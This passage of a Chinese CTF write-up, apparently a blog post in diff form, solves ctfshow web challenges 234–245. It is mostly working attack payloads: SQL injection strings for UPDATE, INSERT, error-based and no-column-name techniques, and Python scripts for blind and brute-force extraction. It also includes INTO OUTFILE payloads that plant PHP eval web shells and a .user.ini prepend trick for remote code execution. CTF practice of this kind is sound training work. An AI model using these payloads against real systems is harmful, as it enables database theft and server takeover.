+<span class="token operator">=</span><span class="token operator">=</span><span class="token operator">></span><span class="token keyword">update</span> ctfshow_user <span class="token keyword">set</span> pass<span class="token operator">=</span><span class="token string">'\'where username = '</span>&#123;$username&#125;'
+
+<span class="token operator">*</span> 此时pass的值
+pass <span class="token operator">=</span> \' <span class="token keyword">where</span> username <span class="token operator">=</span> 
+此时的username可以传
+
+username<span class="token operator">=</span><span class="token punctuation">,</span> username<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Payload：</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">username<span class="token operator">=</span><span class="token punctuation">,</span>username<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">-- &amp;password=\</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss82hp0e6j30q904h0t1.jpg" alt="image-20210724183654486"></p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">username<span class="token operator">=</span><span class="token punctuation">,</span>username<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">and</span> table_name<span class="token operator">=</span><span class="token number">0x666c6167323361</span><span class="token punctuation">)</span><span class="token comment">-- &amp;password=\</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss8g7orujj313q0gdtak.jpg" alt="image-20210724185008161"></p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">username<span class="token operator">=</span><span class="token punctuation">,</span>username<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">select</span> flagass23s3 <span class="token keyword">from</span> flag23a<span class="token punctuation">)</span> <span class="token comment">-- &amp;password=\</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss8p6sqbsj31130dbmyt.jpg" alt="image-20210724185845496"></p>
+<h2 id="web235-无列名注入"><a href="#web235-无列名注入" class="headerlink" title="web235(无列名注入)"></a>web235(无列名注入)</h2><ul>
+<li>查表名(mysql.innodb_table_stats)</li>
+</ul>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">username<span class="token operator">=</span><span class="token punctuation">,</span>username<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> mysql<span class="token punctuation">.</span>innodb_table_stats <span class="token keyword">where</span> database_name<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">-- - &amp;password=\</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss9leuccxj30xz0g9766.jpg" alt="image-20210724192927750"></p>
+<ul>
+<li>无列名注入</li>
+</ul>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">username<span class="token operator">=</span><span class="token punctuation">,</span>username<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">select</span> b <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span> <span class="token keyword">as</span> b<span class="token punctuation">,</span> <span class="token number">3</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> flag23a1 <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">)</span><span class="token comment">-- &amp;password=\</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss9qseh0fj312u0dhtab.jpg" alt="image-20210724193453641"></p>
+<h2 id="Web236-无列名注入"><a href="#Web236-无列名注入" class="headerlink" title="Web236(无列名注入)"></a>Web236(无列名注入)</h2><ul>
+<li><p>mysql.innodb_table_stats</p>
+</li>
+<li><p>查表名</p>
+</li>
+</ul>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">username<span class="token operator">=</span><span class="token punctuation">,</span>username<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> mysql<span class="token punctuation">.</span>innodb_table_stats <span class="token keyword">where</span> database_name<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">-- &amp;password=\</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss9x091dlj311s0g2wg7.jpg" alt="image-20210724194052115"></p>
+<ul>
+<li>无列名注入</li>
+</ul>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">username<span class="token operator">=</span><span class="token punctuation">,</span>username<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">select</span> b <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span> <span class="token keyword">as</span> b<span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> flaga <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">)</span> <span class="token comment">-- &amp;password=\</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gssa2et9vhj613z0dg75z02.jpg" alt="image-20210724194603525"></p>
+<h2 id="Web237-insert"><a href="#Web237-insert" class="headerlink" title="Web237(insert)"></a>Web237(insert)</h2><ul>
+<li><p>利用insert函数执行查询语句</p>
+</li>
+<li><p>查表名</p>
+</li>
+</ul>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">3</span>'<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">-- A</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gssb3mofhkj30wo0b00sy.jpg" alt="image-20210724202149287"></p>
+<ul>
+<li>查列名</li>
+</ul>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">4</span><span class="token string">',(select group_concat(column_name) from information_schema.columns where table_name='</span>flag'<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gssb7udwklj30un08kjri.jpg" alt="image-20210724202551751"></p>
+<ul>
+<li>查字段</li>
+</ul>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">4</span>'<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> flagass23s3 <span class="token keyword">from</span> flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gssb9lkvj9j310i07et8v.jpg" alt="image-20210724202733290"></p>
+<h2 id="web238"><a href="#web238" class="headerlink" title="web238"></a>web238</h2><ul>
+<li>查表</li>
+</ul>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">2</span>'<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token punctuation">)</span><span class="token keyword">where</span><span class="token punctuation">(</span>table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gssbj67aiej30x6047mx3.jpg" alt="image-20210724203644672"></p>
+<ul>
+<li>查字段</li>
+</ul>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">2</span><span class="token string">',(select(group_concat(column_name))from(information_schema.columns)where(table_name='</span>flagb'<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gssbkhjdr3j30vv03xdfu.jpg" alt="image-20210724203800010"></p>
+<ul>
+<li>查内容</li>
+</ul>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">2</span>'<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>flagb<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gssbn5jfp8j30vb05uaaa.jpg" alt="image-20210724204034289"></p>
+<h2 id="web239"><a href="#web239" class="headerlink" title="web239"></a>web239</h2><ul>
+<li>查表</li>
+</ul>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">2</span>'<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>mysql<span class="token punctuation">.</span>innodb_table_stats<span class="token punctuation">)</span><span class="token keyword">where</span><span class="token punctuation">(</span>database_name<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gssbsgkv5mj30w703h3yh.jpg" alt="image-20210724204539911"></p>
+<ul>
+<li>查内容</li>
+</ul>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">4</span>'<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>flagbb<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsscvg3q7pj30vy03m3yi.jpg" alt="image-20210724212309832"></p>
+<h2 id="web240"><a href="#web240" class="headerlink" title="web240"></a>web240</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""
+Author:Y4tacker
+"""</span>
+<span class="token keyword">import</span> random
+<span class="token keyword">import</span> requests
+
+url <span class="token operator">=</span> <span class="token string">"http://35620e99-d5a6-4cad-bd1b-7affd322f19b.challenge.ctf.show:8080"</span>
+url_insert <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">"/api/insert.php"</span>
+url_flag <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">"/api/?page=1&amp;limit=1000"</span>
+
+
+<span class="token comment"># 看命函数</span>
+<span class="token keyword">def</span> <span class="token function">generate_random_str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token operator">//</span>生成由ab构成的五位随机数
+    sttr <span class="token operator">=</span> <span class="token string">'ab'</span>
+    str_list <span class="token operator">=</span> <span class="token punctuation">[</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>sttr<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
+    random_str <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>str_list<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> random_str
+
+
+<span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
+    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+        <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"1',(select(flag)from(flag</span><span class="token interpolation"><span class="token punctuation">&#123;</span>generate_random_str<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">)))#"</span></span><span class="token punctuation">,</span>
+        <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">""</span>
+    <span class="token punctuation">&#125;</span>
+    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url_insert<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span> <span class="token operator">//</span>post传参
+    r2 <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url_flag<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token string">"ctfshow"</span> <span class="token keyword">in</span> r2<span class="token punctuation">.</span>text<span class="token punctuation">:</span>       <span class="token operator">//</span>判断flag
+        <span class="token keyword">for</span> i <span class="token keyword">in</span> r2<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
+            <span class="token keyword">if</span>  <span class="token string">"ctfshow&#123;"</span> <span class="token keyword">in</span> i<span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
+                <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+                <span class="token keyword">break</span>
+        <span class="token keyword">break</span>
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="web241"><a href="#web241" class="headerlink" title="web241"></a>web241</h2><p>跑脚本</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">from</span> time <span class="token keyword">import</span> <span class="token operator">*</span>
+url <span class="token operator">=</span> <span class="token string">"http://7e84a93e-e72e-4fa2-947c-1464bdaf9211.challenge.ctf.show:8080/api/delete.php"</span>
+
+
+flag <span class="token operator">=</span> <span class="token string">''</span>
+i<span class="token operator">=</span><span class="token number">0</span>
+<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+    i<span class="token operator">=</span>i<span class="token operator">+</span><span class="token number">1</span>
+    header <span class="token operator">=</span> <span class="token number">32</span>
+    tail <span class="token operator">=</span> <span class="token number">127</span>
+    <span class="token keyword">while</span> header <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>
+        mid <span class="token operator">=</span> <span class="token punctuation">(</span>header <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>
+        payload <span class="token operator">=</span> <span class="token string">"right((select flag from ctfshow_web.flag),20)"</span>
+        <span class="token comment">#payload = "select database()" #cvfshow_web</span>
+        <span class="token comment">#payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()" #banlist,ctfshow_user,flag</span>
+        <span class="token comment">#payload = "select group_concat(column_name) from information_schema.columns where table_name='flag'" #id,flag,knfo""#</span>
+        <span class="token comment">#print(payload)</span>
+        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+            <span class="token string">'id'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">,sleep(0.02),1)"</span></span><span class="token punctuation">,</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
+            s <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">0.4</span><span class="token punctuation">)</span>
+            <span class="token comment">#print(s.text)</span>
+            tail <span class="token operator">=</span> mid
+        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+            header <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>
+        sleep<span class="token punctuation">(</span><span class="token number">0.4</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> header <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>
+        flag<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>header<span class="token punctuation">)</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        <span class="token keyword">break</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
+    sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li>错误率较高，多试几次</li>
+</ul>
+<h2 id="Web242"><a href="#Web242" class="headerlink" title="Web242"></a>Web242</h2><ul>
+<li>题目环境</li>
+</ul>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">sql</span>语句
+
+  <span class="token comment">//备份表</span>
+  $<span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token string">"select * from ctfshow_user into outfile '/var/www/html/dump/&#123;$filename&#125;';"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token keyword">INTO</span> <span class="token keyword">OUTFILE</span> <span class="token string">'file_name'</span>
+        <span class="token punctuation">[</span><span class="token keyword">CHARACTER</span> <span class="token keyword">SET</span> charset_name<span class="token punctuation">]</span>
+        <span class="token punctuation">[</span>export_options<span class="token punctuation">]</span>
+
+export_options:
+    <span class="token punctuation">[</span>&#123;<span class="token keyword">FIELDS</span> <span class="token operator">|</span> <span class="token keyword">COLUMNS</span>&#125;
+        <span class="token punctuation">[</span><span class="token keyword">TERMINATED</span> <span class="token keyword">BY</span> <span class="token string">'string'</span><span class="token punctuation">]</span><span class="token comment">//分隔符</span>
+        <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token keyword">OPTIONALLY</span><span class="token punctuation">]</span> <span class="token keyword">ENCLOSED</span> <span class="token keyword">BY</span> <span class="token string">'char'</span><span class="token punctuation">]</span>
+        <span class="token punctuation">[</span><span class="token keyword">ESCAPED</span> <span class="token keyword">BY</span> <span class="token string">'char'</span><span class="token punctuation">]</span>
+    <span class="token punctuation">]</span>
+    <span class="token punctuation">[</span><span class="token keyword">LINES</span>
+        <span class="token punctuation">[</span><span class="token keyword">STARTING</span> <span class="token keyword">BY</span> <span class="token string">'string'</span><span class="token punctuation">]</span>
+        <span class="token punctuation">[</span><span class="token keyword">TERMINATED</span> <span class="token keyword">BY</span> <span class="token string">'string'</span><span class="token punctuation">]</span>
+    <span class="token punctuation">]</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li>option取值</li>
+</ul>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">“<span class="token keyword">OPTION</span>”参数为可选参数选项，其可能的取值有：
+
+<span class="token punctuation">`</span><span class="token keyword">FIELDS</span> <span class="token keyword">TERMINATED</span> <span class="token keyword">BY</span> <span class="token string">'字符串'</span><span class="token punctuation">`</span>：设置字符串为字段之间的分隔符，可以为单个或多个字符。默认值是“\t”。
+
+<span class="token punctuation">`</span><span class="token keyword">FIELDS</span> <span class="token keyword">ENCLOSED</span> <span class="token keyword">BY</span> <span class="token string">'字符'</span><span class="token punctuation">`</span>：设置字符来括住字段的值，只能为单个字符。默认情况下不使用任何符号。
+
+<span class="token punctuation">`</span><span class="token keyword">FIELDS</span> <span class="token keyword">OPTIONALLY</span> <span class="token keyword">ENCLOSED</span> <span class="token keyword">BY</span> <span class="token string">'字符'</span><span class="token punctuation">`</span>：设置字符来括住<span class="token keyword">CHAR</span>、<span class="token keyword">VARCHAR</span>和<span class="token keyword">TEXT</span>等字符型字段。默认情况下不使用任何符号。
+
+<span class="token punctuation">`</span><span class="token keyword">FIELDS</span> <span class="token keyword">ESCAPED</span> <span class="token keyword">BY</span> <span class="token string">'字符'</span><span class="token punctuation">`</span>：设置转义字符，只能为单个字符。默认值为“\”。
+
+<span class="token punctuation">`</span><span class="token keyword">LINES</span> <span class="token keyword">STARTING</span> <span class="token keyword">BY</span> <span class="token string">'字符串'</span><span class="token punctuation">`</span>：设置每行数据开头的字符，可以为单个或多个字符。默认情况下不使用任何字符。
+
+<span class="token punctuation">`</span><span class="token keyword">LINES</span> <span class="token keyword">TERMINATED</span> <span class="token keyword">BY</span> <span class="token string">'字符串'</span><span class="token punctuation">`</span>：设置每行数据结尾的字符，可以为单个或多个字符。默认值是“\n”。
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Payload:</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">filename<span class="token operator">=</span><span class="token number">3.</span>php<span class="token string">' LINES STARTING BY '</span><span class="token operator">&lt;</span>?php eval<span class="token punctuation">(</span>$_GET<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span>'<span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ul>
+<li>点击导出，抓包，查看<code>filename</code>参数所在位置</li>
+</ul>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gssh6j2o97j30zk0lzn0h.jpg" alt="image-20210724235212879"></p>
+<h2 id="web243"><a href="#web243" class="headerlink" title="web243"></a>web243</h2><ol>
+<li>导出为<code>.user.ini</code>文件</li>
+</ol>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">filename<span class="token operator">=</span><span class="token punctuation">.</span><span class="token keyword">user</span><span class="token punctuation">.</span>ini<span class="token string">' LINES STARTING BY '</span><span class="token punctuation">;</span>' <span class="token keyword">TERMINATED</span> <span class="token keyword">BY</span> <span class="token number">0xda6175746f5f70726570656e645f66696c653d612e6a7067</span><span class="token comment">#</span>
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<ol start="2">
+<li>导出为a.jpg</li>
+</ol>
+<pre class="line-numbers language-none"><code class="language-none">filename&#x3D;a.jpg&#39; LINES TERMINATED BY 0x3c3f706870206576616c28245f504f53545b305d293b3f3e#
+&lt;?php eval($_POST[1]);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<ol start="3">
+<li>访问<code>/dump/index.php</code>,执行rce</li>
+</ol>
+<h2 id="web244-报错注入"><a href="#web244-报错注入" class="headerlink" title="web244(报错注入)"></a>web244(报错注入)</h2><ul>
+<li>报错注入查数据库</li>
+</ul>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsstza80o1j311u0fzjsk.jpg" alt="image-20210725071502375"></p>
+<ul>
+<li>查表</li>
+</ul>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' or updatexml(1,concat('</span><span class="token operator">^</span><span class="token string">',(select group_concat(table_name) from information_schema.tables where table_schema=database()),'</span><span class="token operator">^</span>'<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">-- &amp;page=1&amp;limit=10</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gssu0z4rekj31220evq4n.jpg" alt="image-20210725071639552"></p>
+<ul>
+<li>查字段</li>
+</ul>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' or updatexml(1,concat('</span><span class="token operator">^</span><span class="token string">',(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='</span>ctfshow_flag<span class="token string">'),'</span><span class="token operator">^</span>'<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">-- &amp;page=1&amp;limit=10</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gssu2vq1bvj312c0eewg8.jpg" alt="image-20210725071829401"></p>
+<ul>
+<li>查flag</li>
+</ul>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' or updatexml(1,concat('</span><span class="token operator">^</span><span class="token string">',(select flag from ctfshow_flag),'</span><span class="token operator">^</span><span class="token string">'),1) -- &amp;page=1&amp;limit=10
+
+ctfshow&#123;e089be78-95d3-453d-9dcb
+
+?id=1'</span> <span class="token operator">or</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token string">'^'</span><span class="token punctuation">,</span><span class="token keyword">right</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> flag <span class="token keyword">from</span> ctfshow_flag<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'^'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">-- &amp;page=1&amp;limit=10</span>
+
+d<span class="token operator">-</span><span class="token number">9</span>dcb<span class="token operator">-</span><span class="token number">6</span>ce249c9d500&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gssu5undthj30yd0dhq41.jpg" alt="image-20210725072120806"></p>
+<h2 id="web245"><a href="#web245" class="headerlink" title="web245"></a>web245</h2><ul>
+<li>过滤了<code>updatexml</code>，利用<code>extractvalue</code></li>
+<li>查表</li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">?id&#x3D;1&#39; or extractvalue(1,concat(&#39;^&#39;,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#39;^&#39;)) -- &amp;page&#x3D;1&amp;limit&#x3D;10
+
